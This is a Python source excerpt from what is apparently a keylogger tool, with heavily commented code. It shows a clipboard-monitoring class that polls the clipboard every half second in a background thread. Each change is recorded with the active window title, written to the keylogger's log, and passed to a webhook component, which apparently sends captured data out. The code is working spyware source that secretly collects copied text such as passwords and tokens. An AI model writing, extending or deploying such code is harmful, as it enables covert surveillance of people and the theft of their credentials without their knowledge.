...
class ClipboardMonitor:
    """
    Monitors clipboard for changes and captures clipboard contents.

    This class:
    1. Polls the clipboard every 0.5 seconds
    2. Detects when clipboard content changes
    3. Records clipboard events to the log
    """
    ...
    def __init__(self, keylogger):
        ...
        Args:
            keylogger: The Keylogger instance to write events to
        """
        self.keylogger = keylogger
        self.previous_clipboard = "" # Store last clipboard content
        self._stop_event = Event()   # Signal to stop monitoring
        self._thread = None          # Will hold the monitoring

        # Try to import pyperclip, but don't fail if it's not installed
        try:
            import pyperclip
    ...
    def start(self):
        ...
        2. Starts it (the thread calls _monitor_clipboard in the background)
        3. Returns immediately (doesn't block)
        """
        if not self.enabled:
            return
        
        # Create a new thread that will run _monitor_clipboard
        # daemon=True means this thread stops when the main program stops
        self._thread = Thread(target = self._monitor_clipboard, daemon = True)
        self._thread.start()

    def _monitor_clipboard(self):
        """
        Background task that continuously checks clipboard for changes.

        This runs in a separate thread so it doesn't block keyboard listening.
        """
        while not self._stop_event.is_set():
            try:
                # Get current clipboard content
                current_clipboard = self.pyperclip.paste()

                # Check if clipboard changed from last check
                if current_clipboard != self.previous_clipboard:
                    # Clipboard changed! Log it
                    self.previous_clipboard = current_clipboard
                    self._log_clipboard(current_clipboard)
                
                # Wait 0.5 seconds before checking again
                # This prevents the loop from running too fast
                self._stop_event.wait(0.5)
            except Exception as e:
                # If something goes wrong, log the error but keep running
                print(f"[!] Clipboard monitoring error: {e}")
    
    def _log_clipboard(self, content: str):
        """
        Create and log a clipboard event.

        Args:
            content: The text that was copied/pasted
        """
        # Create a KeyEvent to represent clipboard activity
        # We reuse KeyEvent even though it's not a keyboard event
        event = KeyEvent(
            timestamp = datetime.now(),
            key = f"[CLIPBOARD] {content}",
            window_title = self.keylogger._current_window,
            key_type = KeyType.SPECIAL
        )

        # Write to the same log file as keyboard events
        self.keylogger.log_manager.write_event(event)
        self.keylogger.webhook.add_event(event)

    def stop(self):
        """
        Stop monitoring the clipboard.

        This signals the background thread to stop and waits for it to finish.
        """
        if not self.enabled or not self._thread:
            return

        self._stop_event.set() # Signal thread to stop
        self._thread.join() # Wait for thread to finish (up to 1 second)
...
class Keylogger:
    ...
    def start(self) -> None:
        ...
        self.clipboard_monitor.start() # Start clipboard monitoring
    ...
    def stop(self) -> None:
        ...
        self.clipboard_monitor.stop() # Stop clipboard monitoring
